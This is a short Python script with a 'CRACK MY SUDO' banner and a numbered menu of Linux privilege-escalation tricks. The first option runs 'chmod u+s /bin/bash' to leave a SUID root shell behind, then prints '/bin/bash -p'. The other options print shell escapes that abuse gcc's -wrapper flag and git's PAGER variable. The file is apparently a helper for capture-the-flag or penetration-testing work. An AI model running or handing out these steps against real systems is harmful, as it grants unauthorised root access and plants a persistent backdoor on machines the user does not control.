import os
crack_me = """
 ▗▄▄▖▗▄▄▖  ▗▄▖  ▗▄▄▖▗▖ ▗▖    ▗▖  ▗▖▗▖  ▗▖     ▗▄▄▖▗▖ ▗▖▗▄▄▄  ▗▄▖ 
▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘    ▐▛▚▞▜▌ ▝▚▞▘     ▐▌   ▐▌ ▐▌▐▌  █▐▌ ▐▌
▐▌   ▐▛▀▚▖▐▛▀▜▌▐▌   ▐▛▚▖     ▐▌  ▐▌  ▐▌       ▝▀▚▖▐▌ ▐▌▐▌  █▐▌ ▐▌
▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌    ▐▌  ▐▌  ▐▌      ▗▄▄▞▘▝▚▄▞▘▐▙▄▄▀▝▚▄▞▘
                                                                 
                                                                 
                                                                 
"""
list ="""
[1]-privilegio_python(version:2 ou 3)
[2]-privilegio_bash
[3]-shell
[4]-py_alternative
"""
while True:
	os.system("clear")
	print(f"{crack_me}\n{list}")
	a = int(input("\n"))
	if a == 1:
		os.system("chmod u+s /bin/bash")
		print("/bin/bash -p")
		break
	elif a == 2:
		print("bash")
		break
	elif a == 3:
		print("gcc -wrapper /bin/sh,-s .")
		break
	elif a == 4:
		print("""PAGER='sh -c "exec sh 0<&1"' git -p help""")
		
		break
	else:
		print("not found")
		break

